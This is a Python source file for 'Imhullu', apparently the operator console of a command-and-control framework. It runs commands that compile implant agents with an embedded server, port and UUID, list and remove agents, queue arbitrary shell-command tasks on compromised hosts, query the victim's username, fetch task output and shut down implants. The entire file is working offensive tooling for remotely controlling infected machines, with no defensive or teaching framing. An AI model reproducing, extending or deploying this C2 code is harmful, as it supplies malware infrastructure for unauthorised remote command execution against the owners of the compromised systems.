import cmd
import functools
import requests
import json
from base64 import b64decode, b64encode
from module.input_usage import InputUsage
from module.input_type import InputType
from module.module_exception import *
from module.agent import Agent
import tableprint
import subprocess
import importlib
import os
from module.interface import Interface
from module.interface_messages import InterfaceMessages

UNDERLINE = "\033[4m"
RESET = "\033[0m"

class ImhulluCLI(cmd.Cmd):
    running = 1
    interface = Interface("http://127.0.0.1:5001")
    prompt = f"{UNDERLINE}Imhullu>{RESET} "
    
    # override the default functionality
    # https://docs.python.org/3/library/cmd.html#cmd.Cmd.emptyline
    def emptyline(self):
        print()
        return

    def default(self, line):
        """override the default behavior for unrecognized commands"""
        print(f"Unrecognized command: {line}")
        self.do_help('')

    def do_reload(self, arg):
        """reload ImhulluCLI\n\tUsage: <command>\n"""
        raise ImhulluCLIReloadedException

    # Command to exit the tool
    def do_exit(self, arg):
        """exit the program\n\tUsage: <command>\n"""
        print('Goodbye!')
        self.running = 0
        return True

    # Command to list available commands
    def do_help(self, arg):
        """list available commands\n\tUsage: <command>\n"""
        print()
        if arg == 'all':
            for name, method in self.__class__.__dict__.items():
                if callable(method) and name.startswith('do_'):
                    print(f"{name.removeprefix('do_')}: {method.__doc__}")
            print()
            return

        print("Type `help all` to view every command description")
        super().do_help(arg)
        print()

    def complete_help(self, text, line, begidx, endidx):
        """Provide tab completion for the 'greet' command."""
        params = [method.removeprefix("do_") for method in self.__class__.__dict__.keys() if method.startswith("do_")]
        params.append('all')
        if not text:
            # If no text is entered, return all names
            completions = params[:]
        else:
            # Filter names based on the text entered
            completions = [param for param in params if param.startswith(text)]
        return completions

    def do_change_agent_uuid(self, agent_uuid: str):
        """change current agent uuid\n\tUsage: <command> <agent_uuid>\n"""
        if not agent_uuid:
            print("Usage: " + InputUsage.ChangeAgentUUID.value + '\n')
            return

        self.interface.agent_uuid = agent_uuid
        self.prompt = f"{self.interface.agent_uuid}\n{UNDERLINE}Imhullu>{RESET} ";

    def _compile_agent(self, name, server, port, uuid):
        """modify agent server and port then compiler"""
        pi_server = ''
        pi_uuid = ''
        for char in server:
            pi_server += "'" + char + "'" + ','
        for char in uuid:
            pi_uuid += "'" + char + "'" + ','
            
        pi_server += '0'  # null terminator
        pi_uuid += '0'    # null terminator

        command = ["make", f'SERVER_M="{pi_server}"', f'PORT_M="{port}"', f'UUID_M="{pi_uuid}"']
        print(command[0] + ' ' + command[1] + ' ' + command[2] + ' ' + command[3])
        process = subprocess.Popen(command, cwd="../agent/", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        while True:
            # Read a line from the output
            output = process.stdout.readline()
            
            # If the output is empty and the process has finished, break the loop
            if output == '' and process.poll() is not None:
                break
            
            # If there is output, print it
            if output:
                print(output.strip())

        # Wait for the process to complete and get the return code
        return_code = process.wait()

    def do_create_agent(self, args):
        """create a new agent\n\t<command> <name> <server> <port>\n"""
        if not args:
            print("Usage: " + InputUsage.CreateAgent.value + '\n')
            return

        args = args.split(' ')
        uuid = self.interface.create_agent(Agent(name=args[0], server=args[1], port=args[2]))

        print(uuid + '\n')

    def do_shutdown(self, args):
        """terminate implant\n\tUsage: <command>\n"""
        response: str|InterfaceMessages = self.interface.shutdown_agent()

        if isinstance(response, InterfaceMessages) and response == InterfaceMessages.AgentUUIDRequired:
            print(InterfaceMessages.value)
        else:
            print(response)

    def do_remove_agent(self, uuid):
        """remove agent (WIP and terminate implant)\n\tUsage: <command> <agent_uuid>\n"""
        if not uuid:
            print("Usage: " + InputUsage.RemoveAgent.value + '\n')
            return

        remove_agent_payload = {
            "uuid": uuid
        }

        endpoint = "/remove_agent/"
        remove_agent_payload_json = json.dumps(remove_agent_payload)
        print(self.interface.api_post_req(endpoint, post_data=remove_agent_payload_json))
        print("Agent terminated")

    def do_list_agents(self, args):
        """list every agents\n\tUsage: <command>\n"""
        headers = ['Agent ID', 'Agent UUID', 'Agent Name']

        agents = self.interface.get_agents()

        if isinstance(agents, InterfaceMessages) and agents == InterfaceMessages.NoAgentPresent:
            print(agents.value)
            return

        rows = []
        row  = []
        for agent in agents:
            row.append(agent.id)
            row.append(agent.uuid)
            row.append(agent.name)
            row.append(agent.server)
            row.append(agent.port)
            rows.append(row)
            row = []

        tableprint.table(rows, headers)

    def do_cmd(self, args):
        """create a new cmd task\n\tUsage: <command> <arg1> <arg2> ...\n"""
        if not args:
            print("Usage: " + InputUsage.Cmd.value + '\n')
            return

        status = self.interface.cmd(args)

        if status == InterfaceMessages.AgentUUIDRequired:
            print(status.value + '\n')
            return

        print(status)

    def do_whoami(self, line):
        """get user info through GetUserName\n\tUsage: <command>\n"""
        result = self.interface.whoami()
        print(result)

    def do_list_tasks(self, args):
        """show a list of all the agents\n\tUsage: <command>\n"""
        headers = ['Task ID', 'Command Args', 'Command Type', 'Agent UUID']
        tasks: list[Task] | InterfaceMessages = self.interface.get_tasks()

        if tasks == InterfaceMessages.TaskQueueEmpty:
            print(tasks.value + '\n')
            return

        if tasks == InterfaceMessages.AgentUUIDRequired:
            print(tasks.value + '\n')
            return

        rows = []
        row  = []
        for task in tasks:
            row.append(task.id)
            row.append(task.task_params)
            row.append(task.task_type)
            row.append(task.agent_uuid)
            rows.append(row)
            row = []

        print(rows)

        tableprint.table(rows, headers)

    def do_get_task_output(self, args):
        """return the output of the last task\n\tUsage: <command>\n"""
        output = self.interface.get_task_output()
        print(output)
        return

if __name__ == '__main__':
    cli = ImhulluCLI()
    cli.cmdloop()

